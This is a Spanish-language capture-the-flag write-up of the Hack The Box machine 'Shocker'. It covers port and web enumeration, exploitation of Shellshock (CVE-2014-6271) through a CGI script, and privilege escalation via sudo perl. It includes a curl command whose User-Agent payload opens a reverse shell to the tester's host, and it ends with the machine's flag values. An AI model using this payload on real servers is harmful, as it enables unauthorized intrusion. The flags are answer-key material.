# Shocker (Easy Linux)

**Author:** Ph4n3s
**Fecha:** 20/10/2026
**IP:** 10.129.78.142
**Dificultad:** Easy / Linux

---

## 1. Enumeración

### 1.1 Ping

Primero realizamos un `ping -c 5 10.129.78.142`, obteniendo lo siguiente:

```
64 bytes from 10.129.78.142: icmp_seq=1 ttl=63 time=53.7 ms
```

Al tener un TTL de 63 podemos intuir que es una máquina Linux.

### 1.2 Enumeración de puertos abiertos

Utilizamos el siguiente comando:

```
nmap -p- -open -T4 --min-rate 5000 10.129.78.142 -oN ~/HTB_machines/Shocker/ports
```

El output fue el siguiente:

```
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

Tenemos un servicio http por el puerto 80, posiblemente una web, y en el 2222 un servicio identificado como EtherNetIP (en realidad SSH corriendo en un puerto no estándar, como veremos a continuación).

### 1.3 Enumeración de tecnologías

Para profundizar en las versiones de los servicios usamos:

```
nmap -p 80,2222 -sVC --min-rate 5000 -T4 10.129.78.142 -oN ~/HTB_machines/Shocker/targeted
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Apache 2.4.18 es una versión de 2015/2016, y OpenSSH 7.2p2 es de 2016. Ninguna de las dos tiene un RCE directo conocido para esta versión concreta, así que nos centraremos en enumerar el contenido web antes de descartar nada.

Al visitar `http://10.129.78.142` nos encontramos con lo siguiente:

![Página web al entrar por el puerto 80](01-pagina-web.png)

### 1.4 Búsqueda de vulnerabilidades con scripts de nmap

```
nmap -p 80 --script vuln -Pn --min-rate 5000 10.129.78.142 -oN ~/HTB_machines/Shocker/vulns
```

```
PORT   STATE SERVICE
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|     Disclosure date: 2009-09-17
|_http-csrf: Couldn't find any CSRF vulnerabilities.
```

El único resultado es un posible Slowloris (DoS), que descartamos: una denegación de servicio no nos da acceso a la máquina, y es probable que sea un falso positivo. Un `searchsploit` sobre Apache 2.4.18 y OpenSSH 7.2p2 tampoco arroja nada aprovechable, así que pasamos a fuzzear el contenido web.

### 1.5 Fuzzing

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.78.142/cgi-bin/FUZZ -e .sh,.cgi,.pl -mc 200,403
```

Resultado relevante:

```
user.sh                 [Status: 200, Size: 118, Words: 19, Lines: 8, Duration: 67ms]
```

Encontramos un script de shell dentro de `/cgi-bin/`, lo que indica que el servidor ejecuta scripts CGI en Bash — esa es la puerta de entrada.

---

## 2. Explotación

Bash permite definir funciones y guardarlas como variables de entorno para que un proceso hijo pueda heredarlas. Si una variable de entorno empieza con `() {`, Bash la interpreta como definición de función — pero en las versiones vulnerables, Bash no se detiene ahí: sigue leyendo y **ejecuta** cualquier comando que venga después del `;`.

Esto es **Shellshock** (también llamado BashDoor), una vulnerabilidad de 2014 (CVE-2014-6271). Como el servidor CGI traslada cabeceras HTTP (como `User-Agent`) a variables de entorno de Bash antes de ejecutar el script, un atacante que controle esa cabecera controla lo que Bash ejecuta.

Con el siguiente comando lanzamos la reverse shell:

```
curl -s -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.16.120/4444 0>&1" http://10.129.78.142/cgi-bin/user.sh
```

Con un `nc -lvnp 4444` escuchando en nuestra máquina, recibimos la shell como el usuario `shelly`.

### 2.1 Escalada de privilegios

Una vez dentro, comprobamos qué podemos ejecutar como root:

```
sudo -l
```

```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Buscamos `perl` en [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) y ejecutamos:

```
sudo perl -e 'exec "/bin/sh"'
```

Con eso obtenemos una shell como root.

Navegamos a `/root` y hacemos `cat` a `root.txt`. Después a `/home/shelly` y `cat` a `shelly.txt`.

---

## Resumen rápido

**Qué era la máquina:** un servidor web Apache que exponía un script CGI en Bash, vulnerable a Shellshock (CVE-2014-6271).

**Enumeración:** `nmap` → puertos 80 (HTTP) y 2222 (SSH) → versiones sin RCE directo → fuzzing con `ffuf` sobre `/cgi-bin/` → se descubre `user.sh`.

**Explotación:** el CGI pasa la cabecera `User-Agent` al entorno de Bash. Una versión vulnerable de Bash ejecuta cualquier comando colocado después de `() { :; };` en esa variable → `curl` con payload malicioso → reverse shell como `shelly`.

**Escalada de privilegios:** `sudo -l` → `shelly` puede ejecutar `/usr/bin/perl` como root sin contraseña → `sudo perl -e 'exec "/bin/sh"'` (GTFOBins) → shell como root.

**Concepto clave aprendido:** Shellshock no es una inyección de código en el sentido clásico; es un fallo en el *parser* de Bash que confunde el final de una definición de función con el final de una variable de entorno, ejecutando como comandos todo lo que venga después.

---

**Flags:**
- `shelly.txt` → `fde40593b667845862b8984fa0ad854e`
- `root.txt` → `bc4b64775928762be10c699859222e4d`
